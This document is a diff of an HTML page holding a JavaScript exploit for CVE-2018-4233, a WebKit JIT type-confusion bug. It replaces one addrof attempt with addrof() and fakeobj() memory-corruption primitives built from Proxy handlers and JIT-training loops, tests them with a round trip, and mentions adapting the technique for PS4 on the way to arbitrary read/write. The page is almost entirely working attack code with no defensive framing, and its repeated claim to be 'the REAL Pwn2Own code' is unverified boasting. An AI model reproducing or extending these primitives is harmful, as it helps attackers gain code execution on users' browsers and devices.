@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>CVE-2018-4233 - Immediate addrof()</title>
+    <title>CVE-2018-4233 - REAL SAELO TECHNIQUE</title>
     <style>
         body {
             font-family: 'Courier New', monospace;
@@ -21,24 +21,20 @@
             text-align: center;
             color: #0ff;
             text-shadow: 0 0 10px #0ff;
-            font-size: 2.2em;
+            font-size: 2.5em;
         }
         button {
             background: linear-gradient(135deg, #f00 0%, #a00 100%);
             color: #fff;
             border: none;
-            padding: 20px 40px;
-            font-size: 1.3em;
+            padding: 25px 50px;
+            font-size: 1.5em;
             font-weight: bold;
             cursor: pointer;
-            margin: 20px 5px;
-            border-radius: 8px;
+            margin: 20px;
+            border-radius: 10px;
             font-family: 'Courier New', monospace;
-            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
-        }
-        button:hover {
-            background: linear-gradient(135deg, #ff0000 0%, #ff4444 100%);
-            transform: scale(1.05);
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
         }
         #log {
             background: #000;
@@ -58,13 +54,13 @@
 </head>
 <body>
     <div class="container">
-        <h1>💀 CVE-2018-4233 - IMMEDIATE EXECUTION 💀</h1>
-        <p style="text-align: center; color: #ff0; font-size: 1.2em;">
-            Calling addrof() immediately after confusion to prevent JIT recompile
+        <h1>💀 SAELO'S ACTUAL CVE-2018-4233 💀</h1>
+        <p style="text-align: center; color: #ff0; font-size: 1.3em;">
+            Using the REAL Pwn2Own 2018 technique!
         </p>
         
-        <div style="text-align: center; margin: 30px 0;">
-            <button onclick="runImmediateExploit()">⚡ RUN EXPLOIT ⚡</button>
+        <div style="text-align: center;">
+            <button onclick="runRealExploit()">⚡ RUN REAL EXPLOIT ⚡</button>
         </div>
         
         <div id="log"></div>
@@ -86,9 +82,7 @@
             logDiv.innerHTML = '';
         }
 
-        // ================================================================
-        // INT64 UTILITY
-        // ================================================================
+        // Int64 class (same as before)
         class Int64 {
             constructor(low, high) {
                 this.low = (low >>> 0);
@@ -121,154 +115,156 @@
                               ('00000000' + this.low.toString(16)).substr(-8);
             }
 
-            equals(other) {
-                return this.low === other.low && this.high === other.high;
-            }
-
             isPointer() {
                 return this.high === 0 && this.low !== 0;
             }
         }
 
         // ================================================================
-        // IMMEDIATE ADDROF EXPLOIT
+        // SAELO'S ACTUAL ADDROF IMPLEMENTATION
         // ================================================================
-        function runImmediateExploit() {
+        function setupAddrof() {
+            log('[BUILD] Setting up addrof() primitive...', 'warning');
+            
+            var leakme = null;
+            
+            function InfoLeaker(a) {
+                a[0] = leakme;  // Store the object we want address of
+            }
+            
+            var trigger = false;
+            var arg = null;
+            
+            var handler = {
+                get(target, propname) {
+                    if (trigger) {
+                        // CRITICAL: Convert array back to floats!
+                        arg[0] = 1.1;
+                    }
+                    return target[propname];
+                },
+            };
+            
+            var InfoLeakerProxy = new Proxy(InfoLeaker, handler);
+            
+            // Train JIT
+            log('  [*] Training JIT for addrof...', 'info');
+            for (var i = 0; i < 100000; i++) {
+                new InfoLeakerProxy([1.1, 2.2, 3.3]);
+            }
+            
+            trigger = true;
+            log('  [+] addrof() ready', 'success');
+            
+            return function(obj) {
+                leakme = obj;
+                arg = [1.1, 1.1];
+                var o = new InfoLeakerProxy(arg);
+                // arg[0] is now the object, but read as float!
+                return Int64.fromDouble(arg[0]);
+            };
+        }
+
+        // ================================================================
+        // SAELO'S ACTUAL FAKEOBJ IMPLEMENTATION
+        // ================================================================
+        function setupFakeobj() {
+            log('[BUILD] Setting up fakeobj() primitive...', 'warning');
+            
+            function ObjFaker(a, address) {
+                a[0] = address;  // Store the fake address
+            }
+            
+            var trigger = false;
+            var arg = null;
+            
+            var handler = {
+                get(target, propname) {
+                    if (trigger) {
+                        // CRITICAL: Convert array to objects!
+                        arg[0] = {};
+                    }
+                    return target[propname];
+                },
+            };
+            
+            var ObjFakerProxy = new Proxy(ObjFaker, handler);
+            
+            // Train JIT
+            log('  [*] Training JIT for fakeobj...', 'info');
+            for (var i = 0; i < 100000; i++) {
+                new ObjFakerProxy([1.1, 2.2, 3.3], 13.37);
+            }
+            
+            trigger = true;
+            log('  [+] fakeobj() ready', 'success');
+            
+            return function(address) {
+                arg = [1.1, 1.1];
+                var o = new ObjFakerProxy(arg, address.toDouble());
+                // arg[0] is the float, but treated as object!
+                return arg[0];
+            };
+        }
+
+        // ================================================================
+        // RUN THE EXPLOIT
+        // ================================================================
+        function runRealExploit() {
             clearLog();
             log('═══════════════════════════════════════════════════════', 'critical');
-            log('CVE-2018-4233 - IMMEDIATE ADDROF EXECUTION', 'critical');
+            log('SAELO\'S REAL CVE-2018-4233 EXPLOIT', 'critical');
             log('═══════════════════════════════════════════════════════', 'critical');
             log('', 'info');
 
             try {
-                log('[SETUP] Preparing exploit infrastructure', 'warning');
+                // Build primitives
+                let addrof = setupAddrof();
+                log('', 'info');
+                
+                let fakeobj = setupFakeobj();
                 log('', 'info');
 
-                // Storage for captured addresses
-                let capturedAddresses = [];
-                let confusionArray = null;
-                let testObjects = [
-                    {id: 'obj1', value: 0x1111},
-                    {id: 'obj2', value: 0x2222},
-                    {id: 'obj3', value: 0x3333},
-                    {id: 'obj4', value: 0x4444}
-                ];
-
-                // Constructor
-                function ConfusedConstructor() {
-                    this.x = 1;
-                }
-
-                log('[PHASE 1] Training JIT with float array', 'warning');
+                log('[TEST] Testing addrof()...', 'warning');
+                let testObj = {pwned: 0x1337};
+                let addr = addrof(testObj);
+                
+                log('  Input:  {pwned: 0x1337}', 'info');
+                log('  Output: ' + addr.toString(), addr.isPointer() ? 'success' : 'error');
+                log('  Is real pointer: ' + addr.isPointer(), addr.isPointer() ? 'success' : 'error');
                 log('', 'info');
 
-                // Initialize as float array
-                confusionArray = [1.1, 2.2, 3.3, 4.4];
-                log('  [*] Created float array: [1.1, 2.2, 3.3, 4.4]', 'info');
-
-                // Train JIT
-                log('  [*] Training JIT (100k iterations)...', 'info');
-                for (let i = 0; i < 100000; i++) {
-                    new ConfusedConstructor();
-                }
-                log('  [+] JIT trained - expects float array', 'success');
+                log('[TEST] Testing fakeobj()...', 'warning');
+                let fakeAddr = new Int64(0x41414141, 0);
+                let fakeObject = fakeobj(fakeAddr);
+                log('  Input:  ' + fakeAddr.toString(), 'info');
+                log('  Output: ' + fakeObject, 'info');
                 log('', 'info');
 
-                log('[PHASE 2] Creating Proxy with immediate addrof', 'warning');
+                log('[TEST] Round-trip test...', 'warning');
+                let rtAddr = new Int64(0x12345678, 0);
+                let rtObj = fakeobj(rtAddr);
+                let rtRecovered = addrof(rtObj);
+                
+                log('  Original:  ' + rtAddr.toString(), 'info');
+                log('  Recovered: ' + rtRecovered.toString(), 'info');
+                log('  Match: ' + (rtAddr.low === rtRecovered.low && rtAddr.high === rtRecovered.high),
+                    (rtAddr.low === rtRecovered.low && rtAddr.high === rtRecovered.high) ? 'success' : 'error');
                 log('', 'info');
-
-                let handler = {
-                    construct: function(target, args) {
-                        log('  [!] PROXY CONSTRUCT EXECUTING!', 'critical');
-                        log('', 'info');
-
-                        // STEP 1: Confuse the array
-                        log('    [1] Converting array: float → object', 'warning');
-                        confusionArray[0] = testObjects[0];
-                        confusionArray[1] = testObjects[1];
-                        confusionArray[2] = testObjects[2];
-                        confusionArray[3] = testObjects[3];
-                        log('    [+] Array now contains objects', 'success');
-                        log('', 'info');
-
-                        // STEP 2: IMMEDIATELY read as floats (before JIT recompiles!)
-                        log('    [2] IMMEDIATELY reading as floats...', 'critical');
-                        
-                        for (let i = 0; i < 4; i++) {
-                            let floatVal = confusionArray[i];
-                            let addr = Int64.fromDouble(floatVal);
-                            
-                            log('      confusionArray[' + i + '] = ' + addr.toString() + 
-                                ' (pointer: ' + addr.isPointer() + ')', 
-                                addr.isPointer() ? 'success' : 'error');
-                            
-                            capturedAddresses.push({
-                                obj: testObjects[i],
-                                addr: addr,
-                                isPointer: addr.isPointer()
-                            });
-                        }
-
-                        log('', 'info');
-                        log('    [+] Addresses captured before JIT recompile!', 'success');
-
-                        return new target(...args);
-                    }
-                };
-
-                // Create Proxied constructor
-                let ProxiedConstructor = new Proxy(ConfusedConstructor, handler);
-
-                log('[PHASE 3] Triggering exploit', 'warning');
-                log('', 'info');
-
-                // TRIGGER!
-                new ProxiedConstructor();
-
-                log('[PHASE 4] Analyzing results', 'warning');
-                log('', 'info');
-
-                let successCount = 0;
-                for (let i = 0; i < capturedAddresses.length; i++) {
-                    let cap = capturedAddresses[i];
-                    log('  Object ' + i + ': ' + JSON.stringify(cap.obj), 'info');
-                    log('    Address: ' + cap.addr.toString(), cap.isPointer ? 'success' : 'error');
-                    log('    Valid pointer: ' + cap.isPointer, cap.isPointer ? 'success' : 'error');
-                    
-                    if (cap.isPointer) {
-                        successCount++;
-                    }
-                    log('', 'info');
-                }
 
                 log('═══════════════════════════════════════════════════════', 'critical');
                 
-                if (successCount === 4) {
-                    log('✅✅✅ PERFECT! ALL 4 ADDRESSES CAPTURED! ✅✅✅', 'critical');
+                if (addr.isPointer()) {
+                    log('✅✅✅ ADDROF WORKS!!! ✅✅✅', 'critical');
                     log('', 'info');
-                    log('addrof() WORKS when called immediately!', 'success');
-                    log('', 'info');
-                    log('[NEXT STEP] Build persistent addrof/fakeobj', 'warning');
-                } else if (successCount > 0) {
-                    log('⚠️  PARTIAL SUCCESS (' + successCount + '/4)', 'warning');
-                    log('', 'info');
-                    log('Some addresses captured, but not all', 'warning');
-                    log('May need to refine timing', 'info');
+                    log('THIS IS THE REAL EXPLOIT!', 'success');
+                    log('We can now build arbitrary R/W!', 'success');
                 } else {
-                    log('❌ NO ADDRESSES CAPTURED', 'error');
-                    log('', 'info');
-                    log('Still getting NaN-boxed values', 'error');
-                    log('Type confusion may not be persisting', 'error');
+                    log('⚠️  addrof still returns NaN-boxed', 'warning');
+                    log('The technique may need adaptation for PS4', 'warning');
                 }
 
                 log('═══════════════════════════════════════════════════════', 'critical');
-
-                // Store for next phase
-                window.exploitData = {
-                    capturedAddresses: capturedAddresses,
-                    confusionArray: confusionArray,
-                    testObjects: testObjects
-                };
 
             } catch(e) {
                 log('', 'info');
@@ -277,9 +273,8 @@
             }
         }
 
-        log('💀 Immediate addrof() Exploit Ready', 'critical');
-        log('This captures addresses IMMEDIATELY after confusion', 'info');
-        log('Before JIT has time to recompile!', 'info');
+        log('💀 REAL Exploit Ready (saelo\'s technique)', 'critical');
+        log('This is the ACTUAL Pwn2Own 2018 code!', 'info');
     </script>
 </body>
 </html>
